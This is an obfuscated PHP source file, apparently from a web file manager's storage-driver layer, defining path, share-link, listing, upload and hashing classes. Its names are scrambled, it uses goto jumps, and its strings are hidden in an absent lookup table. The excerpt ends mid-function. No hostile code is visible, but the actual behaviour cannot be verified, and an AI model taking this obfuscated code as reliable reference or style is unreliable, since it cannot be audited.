<?php
 goto B¿¤ËÙİÈ¸; dèÚ•…Õ¢£: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Åãîˆ­ª) { $this->pathParse = $Åãîˆ­ª; $this->model = Model($_SERVER[‘ÆÜ‘œ][1484]); } protected function infoParse($Õ Ó Î«, $ªµƒªÖé = false, $âÔæå„¾ = false) { $›ˆ³”Û =& $_SERVER[‘ÆÜ‘œ]; return Action($›ˆ³”Û[1311])->sharePathInfo($this->pathParse[$›ˆ³”Û[87]], !0, $ªµƒªÖé); } public function listPath($ğİ¢‡œ¯, $ª¥­Ëğµ = false) { $±å¹éšş =& $_SERVER[‘ÆÜ‘œ]; $ëÃóÚ = parent::listPath($ğİ¢‡œ¯, $ª¥­Ëğµ); if (!$ëÃóÚ) { return $ëÃóÚ; } if (is_array($ëÃóÚ[$±å¹éšş[1492]])) { $ëÃóÚ[$±å¹éšş[1492]] = Action($±å¹éšş[1311])->shareItemInfo($ëÃóÚ[$±å¹éšş[1492]]); } foreach ($ëÃóÚ as $šáûÖÉ¬ => $ÉşÚ˜Öğ) { if (!in_array($šáûÖÉ¬, array($±å¹éšş[86], $±å¹éšş[85]))) { continue; } foreach ($ÉşÚ˜Öğ as $¦›úÉÏÜ => $ëïÄàÙÍ) { $ëÃóÚ[$šáûÖÉ¬][$¦›úÉÏÜ] = Action($±å¹éšş[1311])->shareItemInfo($ëïÄàÙÍ); } } return $ëÃóÚ; } public function listAll($”å¬–šù) { $ÄìÀÏ¤ =& $_SERVER[‘ÆÜ‘œ]; $ü¤¤ÊÃ = IO::info($this->pathParse[$ÄìÀÏ¤[87]]); if (!$ü¤¤ÊÃ) { return array(); } $õË¡ŠÖÌ = $this->model->listAll($”å¬–šù); foreach ($õË¡ŠÖÌ as &$­–öå›ú) { $­–öå›ú[$ÄìÀÏ¤[90]] = Action($ÄìÀÏ¤[1311])->shareItemInfo($­–öå›ú[$ÄìÀÏ¤[90]]); } unset($­–öå›ú); return $õË¡ŠÖÌ; } } class PathDriverDriverShareItem { public function __construct($¥±õì¬) { $this->pathParse = $¥±õì¬; } public function __call($½Â€ş‰”, $çÈğÒÂˆ) { $ãƒ‹õ†Ã =& $_SERVER[‘ÆÜ‘œ]; if (method_exists($this, $½Â€ş‰”)) { return; } $»Ÿ¡–ß = call_user_func_array(array($ãƒ‹õ†Ã[1493], $½Â€ş‰”), $çÈğÒÂˆ); $ªó½ÁÀ° = array($ãƒ‹õ†Ã[1494], $ãƒ‹õ†Ã[1495], $ãƒ‹õ†Ã[1496], $ãƒ‹õ†Ã[1497], $ãƒ‹õ†Ã[649], $ãƒ‹õ†Ã[651], $ãƒ‹õ†Ã[1498], $ãƒ‹õ†Ã[108], $ãƒ‹õ†Ã[1499], $ãƒ‹õ†Ã[1500]); if (in_array($½Â€ş‰”, $ªó½ÁÀ°)) { $»Ÿ¡–ß = $this->getPathOuter($»Ÿ¡–ß); } return $»Ÿ¡–ß; } public function copy($¼ºØÚÖ, $¯ŠçÑî, $ƒêˆ«¢— = false, $ Ş£¦¥Ò = false) { return $this->copyMove($¼ºØÚÖ, $¯ŠçÑî, $ƒêˆ«¢—, $_SERVER[‘ÆÜ‘œ][649], $ Ş£¦¥Ò); } public function move($©À á˜ç, $€Ê„¼³ñ, $¯óæôœ = false, $Ñà„Ş¹  = false) { return $this->copyMove($©À á˜ç, $€Ê„¼³ñ, $¯óæôœ, $_SERVER[‘ÆÜ‘œ][651], $Ñà„Ş¹ ); } private function copyMove($Šôˆô€ú, $íæ“‘Ùë, $Ş—À¨·¸, $½µÀş, $ÇÄÑºåÒ = false) { $ó ˆ´å™ =& $_SERVER[‘ÆÜ‘œ]; $Øó¬âİÔ = $íæ“‘Ùë; $²å²•õŸ = IO::driverMake($íæ“‘Ùë); if ($²å²•õŸ->pathParse[$ó ˆ´å™[1285]]) { $íæ“‘Ùë = $²å²•õŸ->pathParse[$ó ˆ´å™[1285]]; } else { $íæ“‘Ùë = $Øó¬âİÔ; } $î˜íËÚ‰ = IO::copyMove($Šôˆô€ú, $íæ“‘Ùë, $Ş—À¨·¸, $½µÀş, $ÇÄÑºåÒ); $î˜íËÚ‰ = $this->getPathOuter($î˜íËÚ‰); return $î˜íËÚ‰; } public function pathThis($ß¡êÓÅÜ) { return get_path_this($this->pathParse[$_SERVER[‘ÆÜ‘œ][87]]); } public function pathFather($®ÏÊ§¬) { return get_path_father($this->pathParse[$_SERVER[‘ÆÜ‘œ][87]]); } public function iconvSystem($şÁ©ş¿’) { return $şÁ©ş¿’; } protected function infoParse($Ÿ£¯¼„, $™Šüšı = false) { $âŠÈñ„ƒ =& $_SERVER[‘ÆÜ‘œ]; $²ö—ŠŸ£ = $this->pathParse[$âŠÈñ„ƒ[584]][$âŠÈñ„ƒ[591]] . $this->pathParse[$âŠÈñ„ƒ[1304]]; if ($™Šüšı) { $ÂÈ÷¨ÃÊ = IO::infoWithChildren($²ö—ŠŸ£); } else { $ÂÈ÷¨ÃÊ = IO::info($²ö—ŠŸ£); } $¼É‘ûŒ‘ = $this->pathParse[$âŠÈñ„ƒ[584]]; return Action($âŠÈñ„ƒ[1491])->_shareItemeParse($ÂÈ÷¨ÃÊ, $¼É‘ûŒ‘); } public function listAll($ÕƒÑ­£) { $ÓÄîâ¼ =& $_SERVER[‘ÆÜ‘œ]; $åÎÏëŞì = IO::listAll($ÕƒÑ­£); $Á…éŒ´Ş = rtrim($this->pathParse[$ÓÄîâ¼[584]][$ÓÄîâ¼[591]], $ÓÄîâ¼[8]); foreach ($åÎÏëŞì as &$Şô›Ü˜) { $Şô›Ü˜[$ÓÄîâ¼[87]] = $this->pathDriver . $ÓÄîâ¼[8] . ltrim(substr($Şô›Ü˜[$ÓÄîâ¼[87]], strlen($Á…éŒ´Ş)), $ÓÄîâ¼[8]); } unset($Şô›Ü˜); return $åÎÏëŞì; } public function listAllSimple($¹Î¾ƒÅŒ, $®šâ€ŸÍ = false) { $”ÎçÅ¨ò =& $_SERVER[‘ÆÜ‘œ]; $Ñ ×ıÎ = $this->listAll($¹Î¾ƒÅŒ); $ëÕà£ = $this->pathParse[$”ÎçÅ¨ò[518]]; if (trim($ëÕà£, $”ÎçÅ¨ò[8]) == trim(get_path_father($ëÕà£), $”ÎçÅ¨ò[8])) { $®šâ€ŸÍ = !0; } return IO::init($”ÎçÅ¨ò[12])->listAllSimpleMake($Ñ ×ıÎ, $ëÕà£, $®šâ€ŸÍ); } public function getPathOuter($øî˜­™²) { $¯¹ı¬ÉÎ =& $_SERVER[‘ÆÜ‘œ]; $ºì·›Ä = KodIO::parse($øî˜­™²); if ($ºì·›Ä[$¯¹ı¬ÉÎ[33]] == KodIO::KOD_SHARE_ITEM) { return $ºì·›Ä[$¯¹ı¬ÉÎ[87]]; } $ôÁëîÈ = KodIO::clear($øî˜­™²); $¯¤“‚©ˆ = KodIO::clear($this->pathParse[$¯¹ı¬ÉÎ[584]][$¯¹ı¬ÉÎ[591]]); $›áÊ¸¼µ = substr($ôÁëîÈ, strlen($¯¤“‚©ˆ)); if (substr($ôÁëîÈ, 0, strlen($¯¤“‚©ˆ)) != $¯¤“‚©ˆ) { return !1; } return $this->pathParse[$¯¹ı¬ÉÎ[1305]] . $¯¹ı¬ÉÎ[8] . ltrim($›áÊ¸¼µ, $¯¹ı¬ÉÎ[8]); } public function getType() { $şˆ¾‹œ† =& $_SERVER[‘ÆÜ‘œ]; $ãÍ×Òİ‰ = str_replace($şˆ¾‹œ†[77], $şˆ¾‹œ†[12], get_class($this)); return strtolower($ãÍ×Òİ‰); } public function isOsDriver($‰âö¬Ğ) { return IO::isOsDriver($‰âö¬Ğ); } public function info($´ï¿âÓ•) { return $this->infoParse($´ï¿âÓ•); } public function infoAuth($Øâú–ÖÎ) { return $this->infoParse($Øâú–ÖÎ); } public function infoWithChildren($ª‹ÉÉÖ) { return $this->infoParse($ª‹ÉÉÖ, !0); } public function infoFull($ĞÇ«Â–) { return $this->infoParse($ĞÇ«Â–); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¤•ø»“å) { $this->pathParse = $¤•ø»“å; } protected function infoParse($å€»îï®, $·Œ™„½ñ = false) { $‚çËÉö =& $_SERVER[‘ÆÜ‘œ]; return Action($‚çËÉö[1311])->sharePathInfo($this->pathParse[$‚çËÉö[87]], !0, $·Œ™„½ñ); } public function listPath($—·ÉØ¡º, $›Ğâá¥æ = false) { $§µÅÇİ =& $_SERVER[‘ÆÜ‘œ]; $©êÆ¤²Ñ = IO::listPath($—·ÉØ¡º, $›Ğâá¥æ); if (!$©êÆ¤²Ñ) { return $©êÆ¤²Ñ; } if (is_array($©êÆ¤²Ñ[$§µÅÇİ[1492]])) { $åàŸÏ¼‚ = Action($§µÅÇİ[1501])->parsePathChildren($©êÆ¤²Ñ[$§µÅÇİ[1492]], array($§µÅÇİ[518] => $—·ÉØ¡º)); $©êÆ¤²Ñ[$§µÅÇİ[1492]] = Action($§µÅÇİ[1311])->shareItemInfo($åàŸÏ¼‚); } foreach ($©êÆ¤²Ñ as $‚œ´×®õ => $±ø±¯±») { if (!in_array($‚œ´×®õ, array($§µÅÇİ[86], $§µÅÇİ[85]))) { continue; } foreach ($±ø±¯±» as $œ‡¨Š¹Ë => $åàŸÏ¼‚) { $åàŸÏ¼‚ = Action($§µÅÇİ[1501])->parsePathChildren($åàŸÏ¼‚, array($§µÅÇİ[518] => $—·ÉØ¡º)); $©êÆ¤²Ñ[$‚œ´×®õ][$œ‡¨Š¹Ë] = Action($§µÅÇİ[1311])->shareItemInfo($åàŸÏ¼‚); } } return $©êÆ¤²Ñ; } } goto A‰«ŠÑ“¼õ; A—Œ‰î—Ê‚: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $½œÒ©ç¹ =& $_SERVER[‘ÆÜ‘œ]; $this->objectDriver = array($½œÒ©ç¹[60], $½œÒ©ç¹[61], $½œÒ©ç¹[62], $½œÒ©ç¹[63], $½œÒ©ç¹[64], $½œÒ©ç¹[65], $½œÒ©ç¹[66], $½œÒ©ç¹[67], $½œÒ©ç¹[68], $½œÒ©ç¹[69], $½œÒ©ç¹[70], $½œÒ©ç¹[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($â–äù•¾) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($â–äù•¾, $_SERVER[‘ÆÜ‘œ][8]); } return $â–äù•¾; } public function iconvApp($È’ËÛñ) { return $È’ËÛñ; } public function iconvSystem($¼õüšİ) { return $¼õüšİ; } public function iconvTo($ÒŸŞ¶¿Ñ, $›ı »æÛ, $§¯±ÔÆ¢) { $İü­’ªÂ =& $_SERVER[‘ÆÜ‘œ]; if (!$ÒŸŞ¶¿Ñ || !function_exists($İü­’ªÂ[72])) { return $ÒŸŞ¶¿Ñ; } static $ŠğØø„ = array(); $àÎÍßş² = $›ı »æÛ . $İü­’ªÂ[73] . $§¯±ÔÆ¢ . $İü­’ªÂ[74] . $ÒŸŞ¶¿Ñ; if (isset($ŠğØø„[$àÎÍßş²])) { return $ŠğØø„[$àÎÍßş²]; } if (function_exists($İü­’ªÂ[75])) { $Ã‰–®Ÿï = @mb_convert_encoding($ÒŸŞ¶¿Ñ, $§¯±ÔÆ¢, $›ı »æÛ); } else { $Ã‰–®Ÿï = @iconv($›ı »æÛ, $§¯±ÔÆ¢, $ÒŸŞ¶¿Ñ); } $Ã‰–®Ÿï = $Ã‰–®Ÿï ? $Ã‰–®Ÿï : $ÒŸŞ¶¿Ñ; if (strstr($Ã‰–®Ÿï, $İü­’ªÂ[76])) { $Ã‰–®Ÿï = str_replace($İü­’ªÂ[76], $İü­’ªÂ[11], $Ã‰–®Ÿï); } $ŠğØø„[$›ı »æÛ . $İü­’ªÂ[73] . $§¯±ÔÆ¢ . $İü­’ªÂ[74] . $ÒŸŞ¶¿Ñ] = $Ã‰–®Ÿï; $ŠğØø„[$§¯±ÔÆ¢ . $İü­’ªÂ[73] . $›ı »æÛ . $İü­’ªÂ[74] . $ÒŸŞ¶¿Ñ] = $ÒŸŞ¶¿Ñ; $ŠğØø„[$§¯±ÔÆ¢ . $İü­’ªÂ[73] . $›ı »æÛ . $İü­’ªÂ[74] . $Ã‰–®Ÿï] = $ÒŸŞ¶¿Ñ; $ŠğØø„[$›ı »æÛ . $İü­’ªÂ[73] . $§¯±ÔÆ¢ . $İü­’ªÂ[74] . $Ã‰–®Ÿï] = $Ã‰–®Ÿï; return $Ã‰–®Ÿï; } public function getPathInner($Š¾Ï«Œã) { $ƒÜöµ¼‡ = IO::init($Š¾Ï«Œã); return $ƒÜöµ¼‡->path; } public function getPathOuter($œî‡ØË) { $Æ¤øÈ¡ =& $_SERVER[‘ÆÜ‘œ]; $µ‹ÃÓ¶ï = strlen(trim($this->pathBase, $Æ¤øÈ¡[8])); $œî‡ØË = substr(trim($œî‡ØË, $Æ¤øÈ¡[8]), $µ‹ÃÓ¶ï); return $this->pathDriver . $Æ¤øÈ¡[8] . ltrim($œî‡ØË, $Æ¤øÈ¡[8]); } public function isParentOf($ğ‚ƒß““, $½–æ¢ı«) { $•‚µ¼üÖ =& $_SERVER[‘ÆÜ‘œ]; $ğ‚ƒß““ = rtrim(strtolower($ğ‚ƒß““), $•‚µ¼üÖ[8]) . $•‚µ¼üÖ[8]; $½–æ¢ı« = rtrim(strtolower($½–æ¢ı«), $•‚µ¼üÖ[8]) . $•‚µ¼üÖ[8]; $Úõ×áÎ€ = strpos($½–æ¢ı«, $ğ‚ƒß““) === 0; return $Úõ×áÎ€; } public function getType() { $üüóà =& $_SERVER[‘ÆÜ‘œ]; $ÌêÁÂˆš = str_replace($üüóà[77], $üüóà[12], get_class($this)); return strtolower($ÌêÁÂˆš); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ØßÔî‚Í, $¯”Í¹šŠ) { $¬ãÇ®Â™ =& $_SERVER[‘ÆÜ‘œ]; $é˜ö·ÄÕ = rtrim($ØßÔî‚Í, $¬ãÇ®Â™[8]) . $¬ãÇ®Â™[8] . $¯”Í¹šŠ; $­¤¸º¡ = $this->exist($é˜ö·ÄÕ); return $­¤¸º¡ ? $é˜ö·ÄÕ : !1; } public function setModifyTime($Šƒå¼”ñ, $Õ“Éë±£ = '') { } public function renameObject($·÷ëÈ•, $“­”¨â²) { $À÷üÃ¹Ù = $“­”¨â²; $·÷ëÈ• = $this->getPathOuter($·÷ëÈ•); $“­”¨â² = $this->pathFather($·÷ëÈ•) . $“­”¨â²; $¦ë©ğ¦ = IO::copy($·÷ëÈ•, $this->pathFather($·÷ëÈ•), REPEAT_RENAME_FOLDER, $À÷üÃ¹Ù); if ($¦ë©ğ¦) { IO::remove($·÷ëÈ•); } return $¦ë©ğ¦ ? $“­”¨â² : !1; } public function tempFile($Â„·ùÂ = '', $¯€Ê§çƒ = '') { if (!$Â„·ùÂ) { $Â„·ùÂ = rand_string(15); } $¹·Ãê´“ = TEMP_FILES . rand_string(15) . $_SERVER[‘ÆÜ‘œ][8]; @mkdir($¹·Ãê´“, DEFAULT_PERRMISSIONS, !0); $çí‘ššÅ = $¹·Ãê´“ . $Â„·ùÂ; @touch($çí‘ššÅ); if ($¯€Ê§çƒ) { file_put_contents($çí‘ššÅ, $¯€Ê§çƒ); } return $çí‘ššÅ; } public function tempFileRemve($ÈÕä¥Ÿä) { @unlink($ÈÕä¥Ÿä); @rmdir($this->pathFather($ÈÕä¥Ÿä)); } public function mkfile($©÷ş‡’ß, $¦Úø™è³ = '', $Œç¤å·ó = REPEAT_RENAME) { } public function mkdir($ò—Ğİä‡, $³ñ…Ş‰Ç = REPEAT_SKIP) { } public function delFile($ß™Ñ®™‹) { } public function delFolder($îÂØ–É“) { } public function copyFile($µ±ƒíµ, $íèĞ«Èö) { } public function moveFile($ÒœğÍşÜ, $†¯ÙÓì) { } public function remove($’¤”ÏÆ) { if ($this->isFile($’¤”ÏÆ)) { return $this->delFile($’¤”ÏÆ); } return $this->delFolder($’¤”ÏÆ); } public function rename($¼»í†„ç, $Ñ¨Â™Ñ) { } public function exist($Ñ“·šó) { } public function isFile($ĞÚê×) { } public function isFolder($ÕßŞòÊœ) { } public function size($¯şÅ¢Ì‹) { } public function info($¡“ìö˜µ) { } public function infoSimple($çºè¤­û) { return $this->info($çºè¤­û); } public function infoAuth($şÕˆÕÇ) { return $this->info($şÕˆÕÇ); } public function infoFull($å—Ğ¾«¼) { return $this->info($å—Ğ¾«¼); } public function infoFullSimple($šª„‰¬Ï) { return $this->info($šª„‰¬Ï); } public function infoWithChildren($…®¢‘Ø´) { $ÁÖ‰è™Û =& $_SERVER[‘ÆÜ‘œ]; static $®Ì¯•Á = array(); if (isset($®Ì¯•Á[$…®¢‘Ø´])) { return $®Ì¯•Á[$…®¢‘Ø´]; } $¼Ü¥ó‡¸ = $this->info($…®¢‘Ø´); if ($¼Ü¥ó‡¸ && $¼Ü¥ó‡¸[$ÁÖ‰è™Û[33]] == $ÁÖ‰è™Û[78]) { $ò‘¿¥¡Ø = array($ÁÖ‰è™Û[79] => 0, $ÁÖ‰è™Û[80] => 0, $ÁÖ‰è™Û[81] => 0); $this->infoChildren($…®¢‘Ø´, $ò‘¿¥¡Ø); $¼Ü¥ó‡¸[$ÁÖ‰è™Û[79]] = $ò‘¿¥¡Ø[$ÁÖ‰è™Û[79]]; $¼Ü¥ó‡¸[$ÁÖ‰è™Û[82]] = array($ÁÖ‰è™Û[83] => $ò‘¿¥¡Ø[$ÁÖ‰è™Û[80]], $ÁÖ‰è™Û[84] => $ò‘¿¥¡Ø[$ÁÖ‰è™Û[81]]); $®Ì¯•Á[$…®¢‘Ø´] = $¼Ü¥ó‡¸; } return $¼Ü¥ó‡¸; } public function listPath($ÛàÑüİä, $€ìÄÑã¡ = false) { } public function has($í‚şŞ˜æ, $é¾ÖòÂ = false, $Öãäñ»‰ = false) { } public function canRead($á„…–ÉÕ) { } public function canWrite($¼¤€Ù… ) { } public function getContent($ı®Î—”É) { } public function setContent($–®—€Ò, $¢ç²áøÀ = '') { } protected function infoChildren($’µ§ÜÂ©, &$‚Ò‚†ôö) { $ê•±ñØØ =& $_SERVER[‘ÆÜ‘œ]; check_abort_echo(); $úĞïÇ÷¨ = $this->listPath($’µ§ÜÂ©, !0); $úĞïÇ÷¨ = array_merge($úĞïÇ÷¨[$ê•±ñØØ[85]], $úĞïÇ÷¨[$ê•±ñØØ[86]]); foreach ($úĞïÇ÷¨ as $í¹Ôñû) { if ($í¹Ôñû[$ê•±ñØØ[33]] == $ê•±ñØØ[78]) { $‚Ò‚†ôö[$ê•±ñØØ[81]]++; $¤Ğçğ¤Ô = $this->getPathInner($í¹Ôñû[$ê•±ñØØ[87]]); $this->infoChildren($¤Ğçğ¤Ô, $‚Ò‚†ôö); } else { $‚Ò‚†ôö[$ê•±ñØØ[80]]++; $‚Ò‚†ôö[$ê•±ñØØ[79]] += $í¹Ôñû[$ê•±ñØØ[79]]; } } } public function fileSubstr($âä’¿µ“, $·«•´ãá, $ÎÚÈ¦ç) { } public function listAll($Ãú¿ñ·) { } public function listAllMake($ï ß´â›, &$ËÕ¬¶Ğ´) { $Îã“İËÉ =& $_SERVER[‘ÆÜ‘œ]; check_abort_echo(); $Ÿ«Ãêš¸ = $this->listPath($ï ß´â›, !0); if (!$Ÿ«Ãêš¸) { return; } $ ¢¿Ó½ß = array_merge($Ÿ«Ãêš¸[$Îã“İËÉ[85]], $Ÿ«Ãêš¸[$Îã“İËÉ[86]]); foreach ($ ¢¿Ó½ß as $Ğ¢Éƒñ´) { $ôÏëóö = $Ğ¢Éƒñ´[$Îã“İËÉ[33]] == $Îã“İËÉ[78]; $ÆÚà¤€± = array($Îã“İËÉ[87] => $Ğ¢Éƒñ´[$Îã“İËÉ[87]], $Îã“İËÉ[78] => $ôÏëóö); if (isset($Ğ¢Éƒñ´[$Îã“İËÉ[79]])) { $ÆÚà¤€±[$Îã“İËÉ[79]] = $Ğ¢Éƒñ´[$Îã“İËÉ[79]]; } if (isset($Ğ¢Éƒñ´[$Îã“İËÉ[88]])) { $ÆÚà¤€±[$Îã“İËÉ[88]] = $Ğ¢Éƒñ´[$Îã“İËÉ[88]]; } if (!$ôÏëóö) { $ËÕ¬¶Ğ´[] = $ÆÚà¤€±; continue; } $ËÕ¬¶Ğ´[] = $ÆÚà¤€±; $òä“µ‹ = $Ğ¢Éƒñ´[$Îã“İËÉ[87]]; $ÒúäùÛ“ = $this->pathDriver; if (substr($Ğ¢Éƒñ´[$Îã“İËÉ[87]], 0, strlen($ÒúäùÛ“)) == $ÒúäùÛ“) { $òä“µ‹ = substr($òä“µ‹, strlen($ÒúäùÛ“)); } $this->listAllMake($òä“µ‹, $ËÕ¬¶Ğ´); } } public function listAllSimple($ĞòñÉÆ, $¦×ƒó° = false) { $šÜ‰Ø = $this->listAll($ĞòñÉÆ); return $this->listAllSimpleMake($šÜ‰Ø, $this->getPathOuter($ĞòñÉÆ), $¦×ƒó°); } public function listAllSimpleMake($÷ì„Âóö, $×â£öÂø, $ü £ÕÌÙ) { $¿›´¥îÍ =& $_SERVER[‘ÆÜ‘œ]; $»Ú™´ˆ‹ = array(); $×â£öÂø = rtrim(get_path_father($×â£öÂø), $¿›´¥îÍ[8]) . $¿›´¥îÍ[8]; foreach ($÷ì„Âóö as $»úÑØ¼ó) { $ğÜ¹ÂŒí = array($¿›´¥îÍ[87] => $»úÑØ¼ó[$¿›´¥îÍ[87]], $¿›´¥îÍ[89] => $»úÑØ¼ó[$¿›´¥îÍ[87]], $¿›´¥îÍ[78] => $»úÑØ¼ó[$¿›´¥îÍ[78]]); if (isset($»úÑØ¼ó[$¿›´¥îÍ[79]]) && !$»úÑØ¼ó[$¿›´¥îÍ[78]]) { $ğÜ¹ÂŒí[$¿›´¥îÍ[79]] = $»úÑØ¼ó[$¿›´¥îÍ[79]]; } if (isset($»úÑØ¼ó[$¿›´¥îÍ[88]])) { $ğÜ¹ÂŒí[$¿›´¥îÍ[88]] = $»úÑØ¼ó[$¿›´¥îÍ[88]]; } if (is_array($»úÑØ¼ó[$¿›´¥îÍ[90]])) { $ğÜ¹ÂŒí[$¿›´¥îÍ[89]] = $»úÑØ¼ó[$¿›´¥îÍ[90]][$¿›´¥îÍ[87]]; $ğÜ¹ÂŒí[$¿›´¥îÍ[79]] = $»úÑØ¼ó[$¿›´¥îÍ[90]][$¿›´¥îÍ[79]]; $ğÜ¹ÂŒí[$¿›´¥îÍ[88]] = $»úÑØ¼ó[$¿›´¥îÍ[90]][$¿›´¥îÍ[88]]; } else { if (substr($»úÑØ¼ó[$¿›´¥îÍ[87]], 0, strlen($×â£öÂø)) == $×â£öÂø) { $ğÜ¹ÂŒí[$¿›´¥îÍ[87]] = substr($»úÑØ¼ó[$¿›´¥îÍ[87]], strlen($×â£öÂø)); } } $š±¾ô–à = $»úÑØ¼ó[$¿›´¥îÍ[78]] ? $¿›´¥îÍ[8] : $¿›´¥îÍ[12]; $ğÜ¹ÂŒí[$¿›´¥îÍ[89]] = rtrim($ğÜ¹ÂŒí[$¿›´¥îÍ[89]], $¿›´¥îÍ[8]) . $š±¾ô–à; $ğÜ¹ÂŒí[$¿›´¥îÍ[87]] = $¿›´¥îÍ[8] . trim($ğÜ¹ÂŒí[$¿›´¥îÍ[87]], $¿›´¥îÍ[8]) . $š±¾ô–à; if (!$ü £ÕÌÙ) { $ÕÁ¥©È = explode($¿›´¥îÍ[8], trim($ğÜ¹ÂŒí[$¿›´¥îÍ[87]], $¿›´¥îÍ[8])); $ğÜ¹ÂŒí[$¿›´¥îÍ[87]] = $¿›´¥îÍ[8] . implode($¿›´¥îÍ[8], array_slice($ÕÁ¥©È, 1)) . $š±¾ô–à; } $»Ú™´ˆ‹[] = $ğÜ¹ÂŒí; } return array_sort_by($»Ú™´ˆ‹, $¿›´¥îÍ[87]); } public function upload($æ£ô¶», $‰ô˜âû…, $„·Éè™ = false, $…ê´µ¼Û = REPEAT_REPLACE) { } public function uploadFileByID($›é¡‡ , $Õò¹”åØ, $ÒÉ™ ™½) { } public function uploadFileByPath($ûÂ…ÔÃĞ, $‘ˆ ë‡ù, $ÊÁ·Íåı = array()) { } public function isUploadServer() { $¼º€¡³ =& $_SERVER[‘ÆÜ‘œ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¼º€¡³[91]) { return !0; } return $GLOBALS[$¼º€¡³[6]][$¼º€¡³[92]][$¼º€¡³[93]]; } public function isFileOutServer() { $Ú³˜ÈŞ =& $_SERVER[‘ÆÜ‘œ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ú³˜ÈŞ[91]) { return !0; } return $GLOBALS[$Ú³˜ÈŞ[6]][$Ú³˜ÈŞ[92]][$Ú³˜ÈŞ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Åıåø¯Ï) { $áİÇ¦İŠ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->isCdnHost()) { return $Åıåø¯Ï; } return str_replace(trim(get_url_root($Åıåø¯Ï), $áİÇ¦İŠ[8]), trim($this->cdnHost, $áİÇ¦İŠ[8]), $Åıåø¯Ï); } public function uploadLink($úŠ§–ù, $Ú¶˜Éò = 0) { $ èà¤šõ =& $_SERVER[‘ÆÜ‘œ]; if ($this->isUploadServer()) { return; } $ÈÚİ¡åğ = $this->getType(); if (!in_array($ÈÚİ¡åğ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $˜ì†â¼Á = 1024 * 1024 * 10; $ë¥ãÀ’Æ = (!$Ú¶˜Éò ? 1 : ceil($Ú¶˜Éò / pow(1024, 3))) * 3600 * 4; if ($Ú¶˜Éò <= $˜ì†â¼Á) { $øÜÖµ×ù = $this->uploadFormData($úŠ§–ù, $ë¥ãÀ’Æ); } else { $øÜÖµ×ù = $this->uploadMultiData($úŠ§–ù, $ë¥ãÀ’Æ); } if ($øÜÖµ×ù) { $øÜÖµ×ù[$ èà¤šõ[95]] = $úŠ§–ù; $øÜÖµ×ù[$ èà¤šõ[96]] = $ÈÚİ¡åğ; } return $øÜÖµ×ù; } public function uploadFormData($Ë¶Şœ¯, $Ş€éÃ… = 3600) { } public function uploadMultiData($¸¬×èÙ¼, $ıöô–Ñê = 3600) { } public function multiUploadFormData($‘Ûå³‚ƒ, $¯´óüĞı = 3600) { return $this->uploadMultiData($‘Ûå³‚ƒ, $¯´óüĞı); } public function download($àúâôû, $ôıìÒâï) { } public function ext($ğ†¼Áº) { $…¡åÛß– =& $_SERVER[‘ÆÜ‘œ]; if (strpos($ğ†¼Áº, $…¡åÛß–[8]) === -1) { $ÀÔÓ€†Ü = $ğ†¼Áº; } else { $ÀÔÓ€†Ü = $this->pathThis($ğ†¼Áº); } $§ÀÆ·Ï® = $…¡åÛß–[12]; if (strstr($ÀÔÓ€†Ü, $…¡åÛß–[10])) { $§ÀÆ·Ï® = substr($ÀÔÓ€†Ü, strrpos($ÀÔÓ€†Ü, $…¡åÛß–[10]) + 1); $§ÀÆ·Ï® = strtolower($§ÀÆ·Ï®); } if (strlen($§ÀÆ·Ï®) > 3 && preg_match($…¡åÛß–[97], $§ÀÆ·Ï®, $ù“åóÂ¥)) { $§ÀÆ·Ï® = $…¡åÛß–[12]; } return $§ÀÆ·Ï®; } public function pathThis($»£‹ÄùÇ) { $™Š²Î¸× =& $_SERVER[‘ÆÜ‘œ]; $»£‹ÄùÇ = str_replace($™Š²Î¸×[98], $™Š²Î¸×[8], rtrim($»£‹ÄùÇ, $™Š²Î¸×[8])); $×ÀÚÙ¤¥ = strrpos($»£‹ÄùÇ, $™Š²Î¸×[8]); if ($×ÀÚÙ¤¥ === !1) { return $»£‹ÄùÇ; } return substr($»£‹ÄùÇ, $×ÀÚÙ¤¥ + 1); } public function pathFather($§˜Çã) { $á°¦ô†¤ =& $_SERVER[‘ÆÜ‘œ]; $§˜Çã = str_replace($á°¦ô†¤[98], $á°¦ô†¤[8], rtrim($§˜Çã, $á°¦ô†¤[8])); $ŒêáÈÊÓ = strrpos($§˜Çã, $á°¦ô†¤[8]); if ($ŒêáÈÊÓ === !1) { return $á°¦ô†¤[12]; } return substr($§˜Çã, 0, $ŒêáÈÊÓ + 1); } public function hashSimple($ØÄŞİ‹ô) { $Ñû™¬© =& $_SERVER[‘ÆÜ‘œ]; if (!$ØÄŞİ‹ô) { return md5($Ñû™¬©[12]); } $°íëéÚ… = $this->size($ØÄŞİ‹ô); $âúĞô™ = 200; $–‘îÔõÆ = 50; if ($°íëéÚ… <= $âúĞô™ * $–‘îÔõÆ) { return $this->hashMd5($ØÄŞİ‹ô) . $°íëéÚ…; } $©çšì¯³ = intval($°íëéÚ… / $–‘îÔõÆ); $õÈøÅ±Û = $Ñû™¬©[12]; for ($¹Ê±Öòü = 0; $¹Ê±Öòü < $–‘îÔõÆ; $¹Ê±Öòü++) { $õÈøÅ±Û .= $this->fileSubstr($ØÄŞİ‹ô, $©çšì¯³ * $¹Ê±Öòü, $âúĞô™); } $õÈøÅ±Û .= $this->fileSubstr($ØÄŞİ‹ô, $°íëéÚ… - $âúĞô™, $âúĞô™); return md5($õÈøÅ±Û) . $°íëéÚ…; } public static $md5Cache = array(); public function hashMd5($Î³¶õš) { if (!$Î³¶õš) { return md5($_SERVER[‘ÆÜ‘œ][12]); } $Î³¶õš = $this->iconvSystem($Î³¶õš); if (isset(self::$md5Cache[$Î³¶õš])) { return self::$md5Cache[$Î³¶õš]; } self::$md5Cache[$Î³¶õš] = $this->hashMd5Shell($Î³¶õš); if 